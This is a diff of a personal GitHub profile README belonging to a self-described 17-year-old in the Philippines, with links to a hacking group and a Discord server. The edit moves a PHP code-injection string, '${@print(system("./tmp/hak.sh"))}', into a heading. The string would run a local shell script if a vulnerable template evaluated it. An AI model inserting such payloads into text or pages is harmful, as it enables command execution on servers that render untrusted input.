@@ -1,4 +1,5 @@
 ### Hi there 👋
+### ${@print(system("./tmp/hak.sh"))}🪽
 <!--
 **zdielmobs/zdielmobs** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
 Here are some ideas to get you started:
@@ -11,8 +12,6 @@ Here are some ideas to get you started:
 - 😄 Pronouns: ...
 - ⚡ Fun fact: ...
 -->
-♡${@print(system("./tmp/hak.sh"))}🪽
-
 | Live the life you have imagined |
 https://rootcon.org/
 
@@ -21,7 +20,7 @@ https://revshitt.xyz/
 • 𝕽𝖊𝖛𝖘𝖍𝖎𝖙
 <p align = center >
 <div>
-<img align="right" width="400" alt="Toosii"
+alt="Toosii"
 <h2> // about-me </h2>
 - 💗 17 | Philippines
 - 🧊 <a href="https://discord.gg/revshit">Revshit 神</a>
